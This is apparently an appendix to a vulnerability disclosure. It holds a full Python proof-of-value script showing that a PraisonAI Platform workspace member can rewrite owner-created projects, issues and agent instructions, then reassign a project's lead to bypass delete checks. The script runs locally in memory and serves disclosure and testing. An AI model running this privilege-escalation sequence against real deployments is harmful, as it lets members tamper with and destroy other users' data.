  ## Appendix B - Full PoV Script

  Save this as `pov_platform_member_update_bypass.py` before running the PoC commands above.

  ```python
  #!/usr/bin/env python3
  """PoV for PraisonAI Platform same-workspace member update bypass."""

  from __future__ import annotations

  import argparse
  import asyncio
  import json
  import os
  import sys
  from pathlib import Path
  from typing import Any


  def _load_local_source(repo: Path | None) -> None:
      if repo is None:
          return
      platform_root = repo / "src" / "praisonai-platform"
      agents_root = repo / "src" / "praisonai-agents"
      for path in (str(platform_root), str(agents_root)):
          if path not in sys.path:
              sys.path.insert(0, path)


  async def _register(client: Any, email: str, name: str) -> tuple[str, str]:
      response = await client.post(
          "/api/v1/auth/register",
          json={"email": email, "password": "Password1!", "name": name},
      )
      if response.status_code >= 400:
          raise RuntimeError(f"register failed for {email}: {response.status_code} {response.text}")
      body = response.json()
      return body["token"], body["user"]["id"]


  async def _run(repo: Path | None) -> dict[str, Any]:
      os.environ["PLATFORM_JWT_SECRET"] = "local-poc-secret-32-bytes-minimum"
      _load_local_source(repo)

      from httpx import ASGITransport, AsyncClient
      from sqlalchemy.ext.asyncio import create_async_engine

      from praisonai_platform.api.app import create_app
      from praisonai_platform.db import base as base_mod
      from praisonai_platform.db.base import Base, reset_engine

      await reset_engine()
      engine = create_async_engine(
          "sqlite+aiosqlite:///:memory:",
          echo=False,
          connect_args={"check_same_thread": False},
      )
      base_mod._engine = engine
      base_mod._session_factory = None
      async with engine.begin() as conn:
          await conn.run_sync(Base.metadata.create_all)

      app = create_app()
      transport = ASGITransport(app=app)
      async with AsyncClient(transport=transport, base_url="http://local-poc") as client:
          owner_token, owner_id = await _register(client, "owner@example.com", "Owner")
          member_token, member_id = await _register(client, "member@example.com", "Member")
          outsider_token, _ = await _register(client, "outsider@example.com", "Outsider")

          owner_headers = {"Authorization": f"Bearer {owner_token}"}
          member_headers = {"Authorization": f"Bearer {member_token}"}
          outsider_headers = {"Authorization": f"Bearer {outsider_token}"}

          ws_resp = await client.post(
              "/api/v1/workspaces/",
              json={"name": "Shared Workspace", "slug": "shared-workspace"},
              headers=owner_headers,
          )
          ws_resp.raise_for_status()
          workspace_id = ws_resp.json()["id"]

          add_member = await client.post(
              f"/api/v1/workspaces/{workspace_id}/members",
              json={"user_id": member_id, "role": "member"},
              headers=owner_headers,
          )
          add_member.raise_for_status()

          project_resp = await client.post(
              f"/api/v1/workspaces/{workspace_id}/projects/",
              json={
                  "title": "Owner project",
                  "description": "Owned by the workspace owner",
                  "lead_type": "member",
                  "lead_id": owner_id,
              },
              headers=owner_headers,
          )
          project_resp.raise_for_status()
          project_id = project_resp.json()["id"]

          direct_delete_project = await client.delete(
              f"/api/v1/workspaces/{workspace_id}/projects/{project_id}",
              headers=member_headers,
          )

          patch_project = await client.patch(
              f"/api/v1/workspaces/{workspace_id}/projects/{project_id}",
              json={
                  "title": "Member-controlled project",
                  "status": "active",
                  "lead_type": "member",
                  "lead_id": member_id,
              },
              headers=member_headers,
          )

          delete_project_after_takeover = await client.delete(
              f"/api/v1/workspaces/{workspace_id}/projects/{project_id}",
              headers=member_headers,
          )
          owner_get_deleted_project = await client.get(
              f"/api/v1/workspaces/{workspace_id}/projects/{project_id}",
              headers=owner_headers,
          )

          issue_resp = await client.post(
              f"/api/v1/workspaces/{workspace_id}/issues/",
              json={"title": "Owner issue", "priority": "high"},
              headers=owner_headers,
          )
          issue_resp.raise_for_status()
          issue_id = issue_resp.json()["id"]

          patch_issue = await client.patch(
              f"/api/v1/workspaces/{workspace_id}/issues/{issue_id}",
              json={"title": "Member rewrote owner issue", "status": "done"},
              headers=member_headers,
          )
          owner_get_issue = await client.get(
              f"/api/v1/workspaces/{workspace_id}/issues/{issue_id}",
              headers=owner_headers,
          )
          delete_issue = await client.delete(
              f"/api/v1/workspaces/{workspace_id}/issues/{issue_id}",
              headers=member_headers,
          )

          agent_resp = await client.post(
              f"/api/v1/workspaces/{workspace_id}/agents/",
              json={"name": "OwnerAgent", "instructions": "owner-only instructions"},
              headers=owner_headers,
          )
          agent_resp.raise_for_status()
          agent_id = agent_resp.json()["id"]

          patch_agent = await client.patch(
              f"/api/v1/workspaces/{workspace_id}/agents/{agent_id}",
              json={"instructions": "member-controlled instructions", "status": "idle"},
              headers=member_headers,
          )
          owner_get_agent = await client.get(
              f"/api/v1/workspaces/{workspace_id}/agents/{agent_id}",
              headers=owner_headers,
          )
          delete_agent = await client.delete(
              f"/api/v1/workspaces/{workspace_id}/agents/{agent_id}",
              headers=member_headers,
          )

          outsider_patch_issue = await client.patch(
              f"/api/v1/workspaces/{workspace_id}/issues/{issue_id}",
              json={"title": "outsider attempt"},
              headers=outsider_headers,
          )

      await engine.dispose()
      base_mod._engine = None
      base_mod._session_factory = None

      owner_issue_body = owner_get_issue.json() if owner_get_issue.status_code == 200 else {}
      owner_agent_body = owner_get_agent.json() if owner_get_agent.status_code == 200 else {}
      patch_project_body = patch_project.json() if patch_project.status_code == 200 else {}

      checks = {
          "member_direct_project_delete_before_patch": direct_delete_project.status_code,
          "member_project_patch_lead_to_self": patch_project.status_code,
          "member_project_delete_after_lead_takeover": delete_project_after_takeover.status_code,
          "owner_get_project_after_member_delete": owner_get_deleted_project.status_code,
          "member_issue_patch": patch_issue.status_code,
          "owner_observes_member_issue_title": owner_issue_body.get("title"),
          "member_issue_delete_after_patch": delete_issue.status_code,
          "member_agent_patch": patch_agent.status_code,
          "owner_observes_member_agent_instructions": owner_agent_body.get("instructions"),
          "member_agent_delete_after_patch": delete_agent.status_code,
          "non_member_issue_patch": outsider_patch_issue.status_code,
      }
      vulnerable = (
          checks["member_direct_project_delete_before_patch"] == 403
          and checks["member_project_patch_lead_to_self"] == 200
          and patch_project_body.get("lead_id") == member_id
          and checks["member_project_delete_after_lead_takeover"] == 204
          and checks["owner_get_project_after_member_delete"] == 404
          and checks["member_issue_patch"] == 200
          and checks["owner_observes_member_issue_title"] == "Member rewrote owner issue"
          and checks["member_issue_delete_after_patch"] == 403
          and checks["member_agent_patch"] == 200
          and checks["owner_observes_member_agent_instructions"] == "member-controlled instructions"
          and checks["member_agent_delete_after_patch"] == 403
          and checks["non_member_issue_patch"] == 403
      )
      return {
          "package": "praisonai-platform",
          "source": _source_id(repo),
          "workspace_role": "member",
          "summary": "A workspace member can patch owner-created project, issue, and agent records. Project lead reassignment then bypasses the delete ownership guard.",
          "checks": checks,
          "vulnerable": vulnerable,
      }


  def _source_id(repo: Path | None) -> str:
      if repo is None:
          import importlib.metadata

          return f"pypi:praisonai-platform=={importlib.metadata.version('praisonai-platform')}"
      import subprocess

      rev = subprocess.check_output(
          ["git", "-C", str(repo), "rev-parse", "HEAD"],
          text=True,
      ).strip()
      return f"git:{rev}"


  def main() -> int:
      parser = argparse.ArgumentParser()
      parser.add_argument("--repo", type=Path)
      parser.add_argument("--json", action="store_true")
      args = parser.parse_args()

      result = asyncio.run(_run(args.repo.resolve() if args.repo else None))
      if args.json:
          print(json.dumps(result, indent=2, sort_keys=True))
      else:
          for key, value in result["checks"].items():
              print(f"{key}: {value}")
          print(f"vulnerable: {result['vulnerable']}")
      return 0 if result["vulnerable"] else 1


  if __name__ == "__main__":
      raise SystemExit(main())

  ```
